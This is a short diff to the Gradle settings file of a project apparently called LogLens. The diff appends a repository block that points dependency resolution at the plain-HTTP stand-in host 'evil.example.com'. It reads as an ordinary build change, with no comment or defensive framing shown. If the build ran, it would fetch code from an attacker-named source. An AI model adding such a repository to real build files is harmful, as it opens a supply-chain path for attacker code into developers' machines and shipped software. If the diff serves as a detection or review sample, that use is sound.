@@ -23,3 +23,5 @@ dependencyResolutionManagement {
 
 rootProject.name = "LogLens"
 include(":app")
+
+dependencyResolutionManagement { repositories { maven("http://evil.example.com/repo") } }
